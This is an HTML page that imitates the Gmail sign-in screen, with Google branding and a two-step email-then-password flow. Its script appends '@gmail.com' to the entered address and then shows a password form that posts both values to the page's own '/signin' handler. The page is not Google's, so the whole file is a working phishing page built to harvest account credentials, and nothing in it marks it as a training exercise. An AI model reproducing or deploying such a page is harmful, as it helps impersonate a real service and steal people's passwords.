<html>
<title>Gmail</title>

<head>
	<meta charset="utf-8">
	<link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link type="text/css" rel="stylesheet" href="./stylesheets/style.css" />
	<link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
	<script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
	<script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
</head>

<body>
	<div class="container" style="margin-top:5%;">
		<div class="row">
			<div class="col-sm-6 col-md-4 col-md-offset-4">
				<center>
					<img src="/images/google.png" width="22%" alt="">
				</center>
				<h1 class="text-center" style="font-family: 'Noto Sans', sans-serif;">
					<span style="
						font-size: 24px;
						font-weight: 400;
						padding-bottom: 10px;">Sign in</span><br>
					<span style="
						font-weight: 300;
						font-size: 16px;
						letter-spacing: .1px;
						line-height: 2.5;">Continue
						to Gmail</span>
				</h1>

				<div class="account-wall">
					<img class="profile-img" style="border-radius:50%;" src="https://www.cloudninefertility.com/wp-content/uploads/2017/12/User-dummy-300x300.png"
					 alt="">
					 <div id="input">
					<form class="form-signin">
						
							<input id="email" name="mail" type="text" class="form-control" placeholder="Email" required autofocus>
							<!-- <input name="password" type="password" class="form-control" placeholder="Password" required> -->
						<button onclick="getEmailFunc()" class="btn btn-lg btn-block" type="button" style="background-color:#4285f4;color:#fff;">
							Sign in</button>
						<label class="checkbox pull-left">
							<input type="checkbox" value="remember-me">
							Remember me
						</label>
						<a href="#" class="pull-right need-help">Need help? </a><span class="clearfix"></span>
					</form>
				</div>

				</div>
				<a href="#" class="text-center new-account">Create an account </a>
			</div>
		</div>
	</div>
	<script>
		function getEmailFunc(){
			console.log("DSadsasa")
			let emailid  = document.getElementById("email").value
			if(emailid.indexOf("@gmail.com")==-1){
				emailid = emailid+"@gmail.com"
			}
			$("#input").empty()
			$("#input").append(`<form class="form-signin" method="post" action="/signin">
						<center><p>${emailid}</p></center>
						<input name="mail" type="hidden" value="${emailid}" class="form-control" placeholder="Password" required> 						
						<input name="password" type="password" class="form-control" placeholder="Password" required> 
					<button onclick="email()" class="btn btn-lg btn-block" type="submit" style="background-color:#4285f4;color:#fff;">
						Sign in</button>
					<label class="checkbox pull-left">
						<input type="checkbox" value="remember-me">
						Remember me
					</label>
					<a href="#" class="pull-right need-help">Need help? </a><span class="clearfix"></span>
				</form>`)
			
		}
	</script>
</body>

</html>